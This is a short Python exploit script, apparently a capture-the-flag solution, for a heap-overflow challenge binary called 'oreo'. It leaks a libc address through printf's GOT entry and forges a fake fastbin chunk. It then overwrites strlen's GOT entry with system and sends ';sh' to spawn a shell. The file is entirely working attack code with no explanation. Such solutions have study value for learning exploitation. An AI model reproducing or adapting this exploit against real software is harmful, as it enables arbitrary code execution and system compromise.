from zio import *
import pwn
p = zio('stdbuf -o0 ./oreo')
libc = pwn.ELF('/usr/lib/libc.so.6')

def add(name, desp):
	p.writeline('1')
	p.read_until('Rifle name:')
	p.writeline(name)
	p.read_until('Rifle description:')
	p.writeline(desp)
	p.read_until('Action:')

def leave(mesg):
	p.writeline('4')
	p.read_until('o submit with your order:')
	p.writeline(mesg)
	p.interact()
def order():
	p.writeline('3')
	p.read_until('Action:')
def show():
	p.writeline('2')
	return p.read_until('Action:')
printf_got = 0x804A234

#leak
add('a'*27 + l32(printf_got),'b')
data = show()
printf_r = l32(data.split('Description: ')[2][:4])
libc_base = printf_r - libc.symbols['printf']
system_r = libc_base + libc.symbols['system']
log('libcbase: ' + hex(libc_base), 'blue')
log('system: ' + hex(system_r), 'red')

#creat 2 fastbin
for i in range(0x3e):
	add('c'*27 + l32(0), 'dddd')
add('ffff', 'eeee')
order()	

#over write 
fake_ptr = 0x804A2a0
strlen_got = 0x0804A250

add('a'*31 + l32(9) + l32(0x41) + l32(fake_ptr), 'b')	#over write
add('a', 'b')
add('a', l32(strlen_got))	#over write strlen_got
leave(l32(system_r) + ';sh\0')
p.interact()

